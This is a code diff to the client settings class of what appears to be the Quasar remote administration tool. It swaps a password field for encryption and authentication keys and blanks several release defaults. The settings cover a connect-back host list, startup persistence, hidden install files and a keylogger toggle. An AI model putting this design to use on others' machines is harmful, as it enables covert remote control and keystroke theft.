@@ -13,7 +13,8 @@ namespace xClient.Config
         public static string VERSION = System.Windows.Forms.Application.ProductVersion;
         public static string HOSTS = "localhost:4782;";
         public static int RECONNECTDELAY = 500;
-        public static string PASSWORD = "1234";
+        public static string KEY = "1WvgEMPjdwfqIMeM9MclyQ==";
+        public static string AUTHKEY = "NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==";
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
         public static string DIR = Environment.GetFolderPath(SPECIALFOLDER);
         public static string SUBFOLDER = "Test";
@@ -36,22 +37,23 @@ namespace xClient.Config
         }
 #else
         public static string VERSION = "";
-        public static string HOSTS = "localhost:4782;";
+        public static string HOSTS = "";
         public static int RECONNECTDELAY = 5000;
-        public static string PASSWORD = "1234";
+        public static string KEY = "";
+        public static string AUTHKEY = "";
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
         public static string DIR = Environment.GetFolderPath(SPECIALFOLDER);
-        public static string SUBFOLDER = "SUB";
-        public static string INSTALLNAME = "INSTALL";
+        public static string SUBFOLDER = "";
+        public static string INSTALLNAME = "";
         public static bool INSTALL = false;
-        public static bool STARTUP = true;
-        public static string MUTEX = "MUTEX";
-        public static string STARTUPKEY = "STARTUP";
-        public static bool HIDEFILE = true;
-        public static bool ENABLELOGGER = true;
-        public static string ENCRYPTIONKEY = "ENCKEY";
-        public static string TAG = "RELEASE";
-        public static string LOGDIRECTORYNAME = "Logs";
+        public static bool STARTUP = false;
+        public static string MUTEX = "";
+        public static string STARTUPKEY = "";
+        public static bool HIDEFILE = false;
+        public static bool ENABLELOGGER = false;
+        public static string ENCRYPTIONKEY = "";
+        public static string TAG = "";
+        public static string LOGDIRECTORYNAME = "";
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBFOLDER = false;
 
@@ -62,7 +64,6 @@ namespace xClient.Config
             TAG = AES.Decrypt(TAG);
             VERSION = AES.Decrypt(VERSION);
             HOSTS = AES.Decrypt(HOSTS);
-            PASSWORD = AES.Decrypt(PASSWORD);
             SUBFOLDER = AES.Decrypt(SUBFOLDER);
             INSTALLNAME = AES.Decrypt(INSTALLNAME);
             MUTEX = AES.Decrypt(MUTEX);
